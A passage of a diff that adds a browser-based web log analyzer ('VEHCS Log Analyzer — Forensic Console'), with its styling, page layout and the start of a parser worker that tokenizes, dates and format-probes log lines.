@@ -1,0 +1,3624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>VEHCS Log Analyzer — Forensic Console</title>
+<style>
+/* ============================================================================
+   DESIGN TOKENS
+   Palette: "cold instrument" — deep indigo slate chassis, azure signal,
+   amber/coral for escalation. No external fonts, no CDN: runs air-gapped.
+   ========================================================================== */
+:root{
+  --bg:#0a0e17;
+  --bg-grad:radial-gradient(1200px 600px at 20% -10%, #16203a 0%, #0a0e17 60%);
+  --panel:#101725;
+  --panel-2:#0d131f;
+  --raise:#161e30;
+  --line:#1e2740;
+  --line-2:#2a3550;
+
+  --txt:#e7ecf7;
+  --dim:#8e9ab8;
+  --faint:#5c6784;
+
+  --azure:#4cc9f0;
+  --mint:#3ddc97;
+  --amber:#ffb703;
+  --coral:#ff5d73;
+  --violet:#a78bfa;
+  --slate:#7f8bab;
+
+  --sev-critical:#ff4d6d;
+  --sev-high:#ff9f1c;
+  --sev-medium:#4cc9f0;
+  --sev-low:#7f8bab;
+
+  --font-display:"Bahnschrift","DIN Alternate","Segoe UI Semibold","Segoe UI",system-ui,sans-serif;
+  --font-ui:"Segoe UI Variable Text","Segoe UI",system-ui,-apple-system,"Helvetica Neue",sans-serif;
+  --font-mono:"JetBrains Mono","Cascadia Mono","SF Mono",Consolas,ui-monospace,monospace;
+
+  --r:10px;
+  --r-sm:6px;
+  --shadow:0 18px 40px -22px rgba(0,0,0,.9);
+  --sp:18px;
+}
+
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0; background:var(--bg); background-image:var(--bg-grad);
+  color:var(--txt); font-family:var(--font-ui); font-size:14px; line-height:1.5;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:rgba(76,201,240,.28)}
+button,input,select,textarea{font:inherit;color:inherit}
+a{color:var(--azure)}
+
+/* scrollbars */
+*::-webkit-scrollbar{width:10px;height:10px}
+*::-webkit-scrollbar-track{background:transparent}
+*::-webkit-scrollbar-thumb{background:#243052;border-radius:8px;border:2px solid transparent;background-clip:content-box}
+*::-webkit-scrollbar-thumb:hover{background:#31406b;background-clip:content-box}
+
+/* ---------------------------------------------------------------- chrome -- */
+.topbar{
+  position:sticky; top:0; z-index:60;
+  display:flex; align-items:center; gap:20px;
+  padding:12px 22px;
+  background:rgba(10,14,23,.86); backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line);
+}
+.brand{display:flex;align-items:baseline;gap:10px;font-family:var(--font-display);letter-spacing:.04em}
+.brand .mark{
+  font-size:19px;font-weight:700;color:var(--txt);
+  display:flex;align-items:center;gap:9px;text-transform:uppercase;
+}
+.brand .mark::before{
+  content:"";width:9px;height:20px;border-radius:2px;
+  background:linear-gradient(180deg,var(--azure),#2a7fa8);
+  box-shadow:0 0 14px rgba(76,201,240,.55);
+}
+.brand .sub{font-size:11px;color:var(--faint);text-transform:uppercase;letter-spacing:.18em}
+
+.topstats{display:flex;gap:22px;margin-left:auto;align-items:center}
+.tstat{display:flex;flex-direction:column;line-height:1.15}
+.tstat b{font-family:var(--font-mono);font-size:14px;font-variant-numeric:tabular-nums}
+.tstat span{font-size:10px;color:var(--faint);text-transform:uppercase;letter-spacing:.14em}
+
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  background:var(--raise);border:1px solid var(--line-2);color:var(--txt);
+  padding:8px 14px;border-radius:var(--r-sm);cursor:pointer;
+  font-size:12.5px;letter-spacing:.02em;transition:border-color .15s,background .15s,transform .1s;
+}
+.btn:hover{border-color:#3d5183;background:#1b2438}
+.btn:active{transform:translateY(1px)}
+.btn:focus-visible{outline:2px solid var(--azure);outline-offset:2px}
+.btn.primary{background:linear-gradient(180deg,#1d4f68,#143b50);border-color:#2f7ea3;color:#e8fbff}
+.btn.primary:hover{border-color:var(--azure)}
+.btn.ghost{background:transparent}
+.btn[disabled]{opacity:.4;cursor:not-allowed}
+.btn .kbd{font-family:var(--font-mono);font-size:10px;color:var(--faint);border:1px solid var(--line-2);border-radius:3px;padding:0 4px}
+
+/* ---------------------------------------------------------------- layout -- */
+.wrap{max-width:1720px;margin:0 auto;padding:20px 22px 90px}
+.eyebrow{
+  display:flex;align-items:center;gap:9px;
+  font-size:10.5px;letter-spacing:.2em;text-transform:uppercase;color:var(--faint);
+  margin:0 0 10px;
+}
+.eyebrow::before{content:"";width:14px;height:2px;background:var(--azure);opacity:.8}
+.eyebrow .count{margin-left:auto;font-family:var(--font-mono);letter-spacing:.06em;color:var(--dim)}
+
+.panel{
+  background:linear-gradient(180deg,var(--panel) 0%,var(--panel-2) 100%);
+  border:1px solid var(--line); border-radius:var(--r);
+  padding:16px 18px; box-shadow:var(--shadow);
+}
+.grid{display:grid;gap:14px}
+.hidden{display:none !important}
+
+/* ------------------------------------------------------------- drop zone -- */
+#intake{margin-bottom:16px}
+.drop{
+  border:1.5px dashed #2c3a5e;border-radius:var(--r);
+  background:linear-gradient(180deg,rgba(22,30,48,.6),rgba(13,19,31,.6));
+  padding:34px 26px;text-align:center;cursor:pointer;
+  transition:border-color .18s,background .18s;
+  position:relative;overflow:hidden;
+}
+.drop:hover,.drop.hot{border-color:var(--azure);background:rgba(76,201,240,.06)}
+.drop h2{margin:0 0 6px;font-family:var(--font-display);font-size:22px;font-weight:600;letter-spacing:.02em}
+.drop p{margin:0;color:var(--dim);font-size:13px}
+.drop .formats{margin-top:14px;display:flex;gap:8px;justify-content:center;flex-wrap:wrap}
+.chip{
+  font-family:var(--font-mono);font-size:10.5px;color:var(--dim);
+  border:1px solid var(--line-2);border-radius:99px;padding:3px 10px;background:rgba(0,0,0,.2);
+}
+.drop .cta{margin-top:16px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+input[type=file]{display:none}
+
+/* once a capture is loaded the intake collapses to a bar — the analysis is
+   the point of the screen, not the file picker */
+#intake.compact .drop{display:flex;align-items:center;gap:18px;text-align:left;padding:13px 18px}
+#intake.compact .drop h2{font-size:15px;margin:0}
+#intake.compact .drop p,#intake.compact .drop .formats{display:none}
+#intake.compact .drop .cta{margin:0 0 0 auto}
+
+/* file queue */
+.queue{display:flex;flex-direction:column;gap:8px;margin-top:12px}
+.qrow{
+  display:grid;grid-template-columns:1fr 130px 96px 86px 20px;gap:12px;align-items:center;
+  background:var(--panel-2);border:1px solid var(--line);border-radius:var(--r-sm);
+  padding:9px 12px;font-size:12.5px;
+}
+.qrow .nm{font-family:var(--font-mono);font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.qrow .meta{color:var(--faint);font-family:var(--font-mono);font-size:11px;text-align:right;font-variant-numeric:tabular-nums}
+.qrow .fmt{color:var(--azure);font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+.bar{height:4px;background:#1b2438;border-radius:3px;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--azure),var(--mint));width:0;transition:width .2s}
+.qrow .st{width:9px;height:9px;border-radius:50%;background:var(--faint);justify-self:center}
+.qrow .st.run{background:var(--amber);animation:pulse 1.1s infinite}
+.qrow .st.done{background:var(--mint)}
+.qrow .st.err{background:var(--coral)}
+@keyframes pulse{50%{opacity:.25}}
+
+/* --------------------------------------------------- SIGNATURE: strip ----- */
+#stripPanel{padding:14px 16px 8px}
+.strip-head{display:flex;align-items:center;gap:14px;margin-bottom:6px}
+.seg{display:flex;border:1px solid var(--line-2);border-radius:var(--r-sm);overflow:hidden;margin-left:auto}
+.seg button{
+  background:transparent;border:0;padding:5px 12px;font-size:11px;color:var(--dim);cursor:pointer;
+  letter-spacing:.1em;text-transform:uppercase;
+}
+.seg button[aria-pressed=true]{background:rgba(76,201,240,.14);color:var(--azure)}
+.seg button+button{border-left:1px solid var(--line-2)}
+.stripwrap{position:relative}
+#strip{display:block;width:100%;height:132px;cursor:crosshair}
+.strip-legend{display:flex;gap:16px;flex-wrap:wrap;padding:6px 2px 4px;font-size:11px;color:var(--dim)}
+.strip-legend i{display:inline-block;width:9px;height:9px;border-radius:2px;margin-right:6px;vertical-align:-1px}
+.brushinfo{
+  position:absolute;top:8px;left:10px;font-family:var(--font-mono);font-size:11px;
+  background:rgba(10,14,23,.85);border:1px solid var(--line-2);border-radius:var(--r-sm);
+  padding:4px 9px;color:var(--azure);pointer-events:none;
+}
+
+/* --------------------------------------------------------------- KPI row -- */
+.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin:16px 0}
+.kpi{
+  background:linear-gradient(180deg,var(--panel),var(--panel-2));
+  border:1px solid var(--line);border-left:2px solid var(--accent,var(--azure));
+  border-radius:var(--r-sm);padding:12px 14px;
+}
+.kpi .k{font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--faint)}
+.kpi .v{font-family:var(--font-mono);font-size:23px;font-weight:600;font-variant-numeric:tabular-nums;letter-spacing:-.02em;margin-top:2px}
+.kpi .d{font-size:11px;color:var(--dim);margin-top:2px;font-family:var(--font-mono)}
+
+/* --------------------------------------------------------- findings etc -- */
+.cols{display:grid;grid-template-columns:1.15fr .85fr;gap:14px;align-items:start}
+@media (max-width:1180px){.cols{grid-template-columns:1fr}}
+
+.finding{
+  display:grid;grid-template-columns:4px 1fr auto;gap:12px;align-items:center;
+  background:var(--panel-2);border:1px solid var(--line);border-radius:var(--r-sm);
+  padding:10px 12px;cursor:pointer;transition:border-color .15s,transform .1s;
+}
+.finding:hover{border-color:var(--line-2);transform:translateX(2px)}
+.finding .sevbar{width:4px;height:100%;min-height:34px;border-radius:2px;background:var(--sev)}
+.finding h4{margin:0;font-size:13.5px;font-weight:600;display:flex;align-items:center;gap:8px}
+.finding .why{color:var(--dim);font-size:11.5px;margin-top:2px}
+.finding .sample{font-family:var(--font-mono);font-size:10.5px;color:var(--faint);margin-top:4px;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:640px}
+.finding .n{font-family:var(--font-mono);font-size:17px;font-variant-numeric:tabular-nums;text-align:right}
+.finding .n small{display:block;font-size:10px;color:var(--faint);letter-spacing:.1em;text-transform:uppercase}
+.sevtag{
+  font-size:9.5px;letter-spacing:.14em;text-transform:uppercase;border-radius:3px;
+  padding:1px 6px;border:1px solid currentColor;
+}
+.stack{display:flex;flex-direction:column;gap:8px;max-height:520px;overflow:auto;padding-right:4px}
+
+.actor{
+  display:grid;grid-template-columns:1fr auto;gap:10px;padding:10px 12px;
+  border:1px solid var(--line);border-radius:var(--r-sm);background:var(--panel-2);cursor:pointer;
+}
+.actor:hover{border-color:var(--line-2)}
+.actor .ip{font-family:var(--font-mono);font-size:13px}
+.actor .tags{display:flex;gap:5px;flex-wrap:wrap;margin-top:5px}
+.tag{font-size:10px;padding:1px 7px;border-radius:99px;border:1px solid var(--line-2);color:var(--dim);background:rgba(0,0,0,.25)}
+.tag.hot{color:var(--coral);border-color:rgba(255,93,115,.45)}
+.risk{display:flex;flex-direction:column;align-items:flex-end;gap:4px;min-width:96px}
+.risk b{font-family:var(--font-mono);font-size:16px;font-variant-numeric:tabular-nums}
+.riskbar{width:92px;height:5px;border-radius:3px;background:#1b2438;overflow:hidden}
+.riskbar i{display:block;height:100%}
+
+/* ---------------------------------------------------------------- charts -- */
+.chartgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(330px,1fr));gap:14px;margin-top:14px}
+.chartbox h3{margin:0 0 2px;font-family:var(--font-display);font-size:14px;font-weight:600;letter-spacing:.03em}
+.chartbox canvas{display:block;width:100%;height:230px}
+.chartbox.tall canvas{height:290px}
+
+/* --------------------------------------------------------------- explorer */
+#explorer{margin-top:16px}
+.qbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.qinput{
+  flex:1;min-width:280px;display:flex;align-items:center;gap:9px;
+  background:var(--panel-2);border:1px solid var(--line-2);border-radius:var(--r-sm);padding:0 12px;
+}
+.qinput:focus-within{border-color:var(--azure);box-shadow:0 0 0 3px rgba(76,201,240,.12)}
+.qinput input{flex:1;background:none;border:0;outline:0;padding:10px 0;font-family:var(--font-mono);font-size:12.5px}
+.qinput .lead{color:var(--azure);font-family:var(--font-mono);font-size:12px}
+.qerr{color:var(--coral);font-size:11.5px;font-family:var(--font-mono);min-height:16px;margin-top:6px}
+.examples{display:flex;gap:7px;flex-wrap:wrap;margin-top:9px}
+.examples button{
+  font-family:var(--font-mono);font-size:10.5px;color:var(--dim);cursor:pointer;
+  background:rgba(0,0,0,.25);border:1px solid var(--line);border-radius:99px;padding:3px 10px;
+}
+.examples button:hover{color:var(--azure);border-color:rgba(76,201,240,.4)}
+
+.facets{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.facet{display:flex;align-items:center;gap:6px;border:1px solid var(--line);border-radius:var(--r-sm);padding:4px 9px;background:var(--panel-2)}
+.facet span{font-size:10px;text-transform:uppercase;letter-spacing:.12em;color:var(--faint)}
+.facet button{
+  border:1px solid transparent;background:transparent;border-radius:4px;padding:2px 8px;cursor:pointer;
+  font-family:var(--font-mono);font-size:11px;color:var(--dim);
+}
+.facet button[aria-pressed=true]{background:rgba(76,201,240,.16);color:var(--azure);border-color:rgba(76,201,240,.35)}
+
+/* virtualized table */
+.tbl{margin-top:12px;border:1px solid var(--line);border-radius:var(--r-sm);overflow:hidden;background:var(--panel-2)}
+.trow{
+  display:grid;
+  grid-template-columns:168px 132px 62px minmax(200px,1fr) 62px 84px 150px 150px;
+  gap:0;align-items:center;
+}
+.thead{
+  position:sticky;top:0;z-index:3;background:#141c2d;border-bottom:1px solid var(--line-2);
+  font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--faint);
+}
+.thead > div{padding:9px 10px;cursor:pointer;user-select:none;white-space:nowrap}
+.thead > div:hover{color:var(--azure)}
+.thead .arrow{color:var(--azure);font-size:9px}
+#vp{height:520px;overflow:auto;position:relative;contain:strict}
+#spacer{position:relative;width:100%}
+#rows{position:absolute;left:0;right:0;top:0;will-change:transform}
+#rows .trow{
+  height:28px;border-bottom:1px solid rgba(30,39,64,.55);font-family:var(--font-mono);font-size:11.5px;
+  cursor:pointer;
+}
+#rows .trow:hover{background:rgba(76,201,240,.07)}
+#rows .trow.sel{background:rgba(76,201,240,.12)}
+#rows .trow > div{padding:0 10px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.s2{color:var(--mint)} .s3{color:var(--violet)} .s4{color:var(--amber)} .s5{color:var(--coral)} .s0{color:var(--faint)}
+.flagdots{display:flex;gap:3px}
+.flagdots i{width:6px;height:6px;border-radius:50%}
+.empty{padding:40px;text-align:center;color:var(--faint);font-size:13px}
+
+/* drawer */
+#drawer{
+  position:fixed;top:0;right:0;bottom:0;width:min(560px,94vw);z-index:80;
+  background:linear-gradient(180deg,#111828,#0b1019);border-left:1px solid var(--line-2);
+  box-shadow:-30px 0 60px -30px #000;transform:translateX(102%);transition:transform .22s ease;
+  display:flex;flex-direction:column;
+}
+#drawer.open{transform:none}
+.dhead{display:flex;align-items:center;gap:12px;padding:14px 18px;border-bottom:1px solid var(--line)}
+.dhead h3{margin:0;font-family:var(--font-display);font-size:16px;letter-spacing:.03em}
+.dbody{padding:16px 18px;overflow:auto;display:flex;flex-direction:column;gap:14px}
+.kv{display:grid;grid-template-columns:96px 1fr;gap:6px 12px;font-size:12.5px}
+.kv dt{color:var(--faint);font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;padding-top:2px}
+.kv dd{margin:0;font-family:var(--font-mono);font-size:12px;word-break:break-all}
+pre.raw{
+  margin:0;background:#0a0f1a;border:1px solid var(--line);border-radius:var(--r-sm);padding:11px;
+  font-family:var(--font-mono);font-size:11px;color:var(--dim);white-space:pre-wrap;word-break:break-all;max-height:220px;overflow:auto;
+}
+.drawer-actions{display:flex;gap:8px;flex-wrap:wrap}
+
+/* toast */
+#toasts{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);z-index:120;display:flex;flex-direction:column;gap:8px;align-items:center}
+.toast{
+  background:#16203a;border:1px solid var(--line-2);border-left:3px solid var(--azure);
+  padding:9px 16px;border-radius:var(--r-sm);font-size:12.5px;box-shadow:var(--shadow);
+  animation:rise .25s ease;
+}
+.toast.err{border-left-color:var(--coral)}
+@keyframes rise{from{opacity:0;transform:translateY(8px)}}
+
+/* footer note */
+.foot{margin-top:26px;color:var(--faint);font-size:11.5px;display:flex;gap:18px;flex-wrap:wrap;justify-content:space-between}
+.foot code{font-family:var(--font-mono);color:var(--dim)}
+
+@media (prefers-reduced-motion:reduce){*{animation:none !important;transition:none !important}}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="brand">
+    <div class="mark">VEHCS<span style="color:var(--azure)">·</span>Log Analyzer</div>
+    <div class="sub">Forensic console</div>
+  </div>
+
+  <div class="topstats">
+    <div class="tstat"><b id="tsFiles">0</b><span>Files</span></div>
+    <div class="tstat"><b id="tsLines">0</b><span>Lines read</span></div>
+    <div class="tstat"><b id="tsRows">0</b><span>Events</span></div>
+    <div class="tstat"><b id="tsRate">—</b><span>Throughput</span></div>
+    <div class="tstat"><b id="tsMem">—</b><span>Store</span></div>
+  </div>
+
+  <button class="btn" id="btnDemo">Generate demo data</button>
+  <button class="btn" id="btnAdd">Add files</button>
+  <button class="btn ghost" id="btnReset">Reset</button>
+</header>
+
+<main class="wrap">
+
+  <!-- ------------------------------------------------------------- intake -->
+  <section id="intake">
+    <label class="drop" id="drop" for="fileInput">
+      <h2>Drop log files here</h2>
+      <p>Everything is parsed locally in your browser. Nothing is uploaded, nothing leaves this machine.</p>
+      <div class="formats">
+        <span class="chip">Apache / Nginx combined</span>
+        <span class="chip">Common log format</span>
+        <span class="chip">Nginx error</span>
+        <span class="chip">JSON lines</span>
+        <span class="chip">IIS W3C</span>
+        <span class="chip">Syslog</span>
+        <span class="chip">.gz</span>
+        <span class="chip">multi-GB</span>
+      </div>
+      <div class="cta">
+        <span class="btn primary">Choose files</span>
+        <span class="btn ghost" id="btnDemo2">Or load a demo dataset</span>
+      </div>
+    </label>
+    <input type="file" id="fileInput" multiple accept=".log,.txt,.json,.ndjson,.gz,.csv,.out,*/*" />
+    <div class="queue" id="queue"></div>
+  </section>
+
+  <!-- --------------------------------------------------- signature strip -->
+  <section class="panel hidden" id="stripPanel">
+    <div class="strip-head">
+      <p class="eyebrow" style="margin:0">Signal strip — drag to select a time window</p>
+      <div class="seg" role="group" aria-label="Strip metric">
+        <button data-metric="requests" aria-pressed="true">Requests</button>
+        <button data-metric="bytes" aria-pressed="false">Bytes</button>
+        <button data-metric="threats" aria-pressed="false">Threats</button>
+      </div>
+      <button class="btn ghost" id="btnClearBrush" style="padding:5px 10px;font-size:11px">Clear window</button>
+    </div>
+    <div class="stripwrap">
+      <canvas id="strip" data-custom-hover></canvas>
+      <div class="brushinfo hidden" id="brushInfo"></div>
+    </div>
+    <div class="strip-legend" id="stripLegend"></div>
+  </section>
+
+  <!-- ---------------------------------------------------------------- KPI -->
+  <section class="kpis hidden" id="kpis"></section>
+
+  <!-- ------------------------------------------------- findings + actors -->
+  <section class="cols hidden" id="analysis">
+    <div class="panel">
+      <p class="eyebrow">Detections <span class="count" id="findCount"></span></p>
+      <div class="stack" id="findings"></div>
+    </div>
+    <div class="panel">
+      <p class="eyebrow">Threat actors — ranked by composite risk <span class="count" id="actorCount"></span></p>
+      <div class="stack" id="actors"></div>
+    </div>
+  </section>
+
+  <!-- ------------------------------------------------------------- charts -->
+  <section class="chartgrid hidden" id="charts">
+    <div class="panel chartbox"><p class="eyebrow">Status classes</p><canvas id="cStatus"></canvas></div>
+    <div class="panel chartbox"><p class="eyebrow">Methods</p><canvas id="cMethod"></canvas></div>
+    <div class="panel chartbox"><p class="eyebrow">Top endpoints</p><canvas id="cEndpoints"></canvas></div>
+    <div class="panel chartbox"><p class="eyebrow">Top talkers</p><canvas id="cTalkers"></canvas></div>
+    <div class="panel chartbox tall" style="grid-column:span 2"><p class="eyebrow">Activity heatmap — day of week × hour (UTC)</p><canvas id="cHeat"></canvas></div>
+    <div class="panel chartbox"><p class="eyebrow">Response size distribution</p><canvas id="cBytes"></canvas></div>
+    <div class="panel chartbox"><p class="eyebrow">Endpoints returning 5xx</p><canvas id="cErrors"></canvas></div>
+  </section>
+
+  <!-- ----------------------------------------------------------- explorer -->
+  <section class="panel hidden" id="explorer">
+    <p class="eyebrow">Event explorer <span class="count" id="viewCount"></span></p>
+
+    <div class="qbar">
+      <div class="qinput">
+        <span class="lead">›</span>
+        <input id="q" spellcheck="false" autocomplete="off"
+               placeholder='status &gt;= 400 AND ip = 10.0.0.0/8 AND NOT ua ~ "bot"   —  press / to focus' />
+      </div>
+      <button class="btn" id="btnRun">Run</button>
+      <button class="btn ghost" id="btnClearQ">Clear</button>
+      <button class="btn" id="btnCsv">Export CSV</button>
+      <button class="btn" id="btnNdjson">Export NDJSON</button>
+      <button class="btn" id="btnReport">Export report</button>
+      <button class="btn ghost" id="btnData">Export data</button>
+    </div>
+    <div class="qerr" id="qerr"></div>
+
+    <div class="examples" id="examples"></div>
+    <div class="facets" id="facets"></div>
+
+    <div class="tbl">
+      <div class="trow thead" id="thead"></div>
+      <div id="vp">
+        <div id="spacer"><div id="rows"></div></div>
+        <div class="empty hidden" id="emptyMsg">No events match this query.</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="foot">
+    <span>Client-side only · no network calls · workers: <code id="fWorkers">—</code> · store: <code id="fStore">columnar typed arrays</code></span>
+    <span>Query language: <code>field op value</code> · ops <code>= != : ~ &gt; &gt;= &lt; &lt;=</code> · <code>AND OR NOT ( )</code></span>
+  </div>
+</main>
+
+<!-- ------------------------------------------------------------- drawer -->
+<aside id="drawer" aria-hidden="true">
+  <div class="dhead">
+    <h3>Event detail</h3>
+    <button class="btn ghost" id="btnCloseDrawer" style="margin-left:auto;padding:4px 10px">Close</button>
+  </div>
+  <div class="dbody" id="drawerBody"></div>
+</aside>
+
+<div id="toasts"></div>
+<!-- ===========================================================================
+     PARSER WORKER
+     Held as inert text, instantiated from a Blob URL. Runs one worker per
+     file (pool-bounded). Reads the File directly inside the worker so the
+     main thread never touches raw bytes.
+     =========================================================================== -->
+<script id="workerSrc" type="text/js-worker">
+"use strict";
+
+/* ---------------------------------------------------------------- config -- */
+var BATCH = 20000;          // rows per emitted batch
+var RAW_PER_BATCH = 4000;   // raw lines retained per batch (flagged rows first)
+var METHODS = ["GET","POST","PUT","DELETE","HEAD","OPTIONS","PATCH","TRACE","CONNECT","PROPFIND","OTHER"];
+var METHOD_IDX = {};
+for (var mi = 0; mi < METHODS.length; mi++) METHOD_IDX[METHODS[mi]] = mi;
+var OTHER = METHODS.length - 1;
+/* PUT, DELETE, TRACE, CONNECT, PROPFIND — rarely legitimate on a public web tier */
+var SUSPICIOUS_METHOD = new Uint8Array(METHODS.length);
+["PUT", "DELETE", "TRACE", "CONNECT", "PROPFIND"].forEach(function (m) { SUSPICIOUS_METHOD[METHOD_IDX[m]] = 1; });
+
+var RULES = [];             // compiled from init message
+var BIT = {};               // ruleId -> bit
+
+/* ------------------------------------------------------------ dictionary -- */
+function Dict() { this.map = new Map(); this.arr = []; this.sent = 0; this.flags = []; }
+Dict.prototype.id = function (s) {
+  var v = this.map.get(s);
+  if (v !== undefined) return v;
+  v = this.arr.length;
+  this.map.set(s, v);
+  this.arr.push(s);
+  this.flags.push(0);        // filled by caller (rule cache)
+  return v;
+};
+Dict.prototype.delta = function () { var d = this.arr.slice(this.sent); this.sent = this.arr.length; return d; };
+
+/* --------------------------------------------------------- rule caching --- */
+/* Rules are evaluated once per *unique string*, not once per line. Real logs
+   repeat endpoints and user-agents heavily, so this collapses tens of millions
+   of regex tests into tens of thousands. */
+function scoreUrl(s) {
+  var f = 0, dec = s;
+  if (s.indexOf("%") !== -1) { try { dec = decodeURIComponent(s.replace(/\+/g, " ")); } catch (e) { dec = s; } }
+  var probe = dec + " " + s;
+  for (var i = 0; i < RULES.length; i++) {
+    var r = RULES[i];
+    if (r.target === "url" || r.target === "any") { if (r.re.test(probe)) f |= (1 << r.bit); }
+  }
+  if (s.length > 512) f |= (1 << BIT.long_url);
+  return f;
+}
+function scoreUa(s) {
+  var f = 0;
+  for (var i = 0; i < RULES.length; i++) {
+    var r = RULES[i];
+    if (r.target === "ua" || r.target === "any") { if (r.re.test(s)) f |= (1 << r.bit); }
+  }
+  if (!s || s === "-" || s === "") f |= (1 << BIT.empty_ua);
+  return f;
+}
+
+/* --------------------------------------------------------- date helpers --- */
+var MON = { Jan: 0, Feb: 1, Mar: 2, Apr: 3, May: 4, Jun: 5, Jul: 6, Aug: 7, Sep: 8, Oct: 9, Nov: 10, Dec: 11 };
+function parseCLFDate(s) {
+  // 10/Oct/2000:13:55:36 -0700
+  if (s.length < 20) return NaN;
+  var d = +s.substr(0, 2), mo = MON[s.substr(3, 3)], y = +s.substr(7, 4);
+  var h = +s.substr(12, 2), mi = +s.substr(15, 2), se = +s.substr(18, 2);
+  if (mo === undefined || y !== y) return NaN;
+  var off = 0;
+  if (s.length >= 26) {
+    var sign = s.charCodeAt(21) === 45 ? -1 : 1;
+    off = sign * ((+s.substr(22, 2)) * 60 + (+s.substr(24, 2))) * 60000;
+  }
+  var t = Date.UTC(y, mo, d, h, mi, se) - off;
+  return t === t ? t : NaN;
+}
+function parseAnyDate(s) {
+  if (!s) return NaN;
+  var t = Date.parse(s);
+  if (t === t) return t;
+  t = parseCLFDate(s);
+  if (t === t) return t;
+  // 2024/01/02 03:04:05  (nginx error)
+  var m = /^(\d{4})\/(\d\d)\/(\d\d)[ T](\d\d):(\d\d):(\d\d)/.exec(s);
+  if (m) return Date.UTC(+m[1], +m[2] - 1, +m[3], +m[4], +m[5], +m[6]);
+  return NaN;
+}
+
+/* --------------------------------------------------------- CLF tokenizer -- */
+/* Space-delimited, honours "quoted" and [bracketed] groups. Handles common,
+   combined, and vhost-combined without separate regexes or backtracking. */
+var TOKV = [], TOKT = [];
+function tokenize(line) {
+  TOKV.length = 0; TOKT.length = 0;
+  var i = 0, n = line.length;
+  while (i < n) {
+    var c = line.charCodeAt(i);
+    if (c === 32 || c === 9) { i++; continue; }
+    var start, end, type;
+    if (c === 34) {                       // "
+      start = ++i;
+      while (i < n && !(line.charCodeAt(i) === 34 && line.charCodeAt(i - 1) !== 92)) i++;
+      end = i; i++; type = 2;
+    } else if (c === 91) {                // [
+      start = ++i;
+      while (i < n && line.charCodeAt(i) !== 93) i++;
+      end = i; i++; type = 3;
+    } else {
+      start = i;
+      while (i < n && line.charCodeAt(i) !== 32) i++;
+      end = i; type = 1;
+    }
+    TOKV.push(line.slice(start, end)); TOKT.push(type);
+  }
+  return TOKV.length;
+}
+
+/* ------------------------------------------------------------- ECS/JSON --- */
+var JSON_KEYS = {
+  ip: ["remote_addr", "client_ip", "clientip", "c-ip", "src_ip", "source.ip", "client.ip", "remote_ip", "ip", "x_forwarded_for", "forwardedfor", "http_x_forwarded_for", "src", "srcaddr"],
+  ts: ["@timestamp", "timestamp", "time_local", "time", "ts", "eventtime", "date", "datetime", "start_time", "requestreceivedtime"],
+  method: ["method", "request_method", "http.request.method", "verb", "http_method", "cs-method", "httpmethod", "requestmethod"],
+  url: ["request_uri", "uri", "url.original", "url.path", "path", "url", "request", "cs-uri-stem", "http.url", "requesturl", "target"],
+  status: ["status", "status_code", "response_code", "http.response.status_code", "sc-status", "http_status", "responsecode", "elb_status_code"],
+  bytes: ["body_bytes_sent", "bytes_sent", "bytes", "size", "sc-bytes", "response_size", "http.response.body.bytes", "received_bytes", "sent_bytes"],
+  ua: ["http_user_agent", "user_agent.original", "user_agent", "useragent", "agent", "cs(user-agent)", "ua"],
+  ref: ["http_referer", "http_referrer", "referer", "referrer", "http.request.referrer"]
+};
+function flatten(obj, out, prefix, depth) {
+  for (var k in obj) {
+    if (!Object.prototype.hasOwnProperty.call(obj, k)) continue;
+    var v = obj[k], key = prefix ? prefix + "." + k.toLowerCase() : k.toLowerCase();
+    if (v !== null && typeof v === "object" && depth < 3 && !Array.isArray(v)) flatten(v, out, key, depth + 1);
+    else if (out[key] === undefined) out[key] = v;
+  }
+  return out;
+}
+function pick(flat, keys) {
+  for (var i = 0; i < keys.length; i++) { var v = flat[keys[i]]; if (v !== undefined && v !== null && v !== "") return v; }
+  return undefined;
+}
+
+/* ------------------------------------------------------- format probing --- */
+function probe(sample) {
+  var scores = { clf: 0, json: 0, w3c: 0, nginx_error: 0, syslog: 0 };
+  for (var i = 0; i < sample.length; i++) {
+    var l = sample[i];
+    if (!l) continue;
+    if (l.charCodeAt(0) === 35) { if (/^#Fields:/i.test(l)) scores.w3c += 20; continue; }
+    if (l.charCodeAt(0) === 123) { scores.json += 1; continue; }
+    if (/^\d{4}\/\d\d\/\d\d \d\d:\d\d:\d\d \[/.test(l)) { scores.nginx_error += 1; continue; }
+    if (tokenize(l) >= 6) {
+      var hasBracketDate = false, hasStatus = false;
+      for (var t = 0; t < TOKT.length; t++) {
+        if (TOKT[t] === 3 && parseCLFDate(TOKV[t]) === parseCLFDate(TOKV[t])) hasBracketDate = true;
+        if (TOKT[t] === 1 && TOKV[t].length === 3 && +TOKV[t] >= 100 && +TOKV[t] < 600) hasStatus = true;
+      }
+      if (hasBracketDate && hasStatus) { scores.clf += 1; continue; }
+    }
+    if (/^<\d{1,3}>/.test(l) || /^[A-Z][a-z]{2} [ \d]\d \d\d:\d\d:\d\d /.test(l)) { scores.syslog += 1; continue; }
+  }
+  var best = "generic", bv = 0;
+  for (var k in scores) if (scores[k] > bv) { bv = scores[k]; best = k; }
+  var conf = sample.length ? Math.min(1, bv / Math.max(1, sample.length)) : 0;
+  return { format: bv > 0 ? best : "generic", confidence: conf };
+}
+
+/* ------------------------------------------------------------- emitters --- */
